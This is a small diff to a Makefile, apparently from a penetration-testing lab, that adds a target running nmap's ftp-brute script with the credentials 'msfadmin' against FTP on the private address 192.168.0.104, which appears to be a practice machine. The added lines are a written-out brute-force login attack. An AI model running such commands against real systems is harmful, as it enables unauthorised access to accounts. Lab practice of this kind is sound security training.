@@ -38,3 +38,7 @@ script-base:
 	cat /usr/share/nmap/nselib/data/passwords.lst
 find-script:
 	find /usr/share/nmap/scripts -name "ftp-brute.nse"
+run-nse:
+	echo msfadmin > users.txt
+	echo msfadmin > pass.txt
+	nmap --script ftp-brute --script-args userdb=users.txt,passdb=pass.txt -p21 192.168.0.104
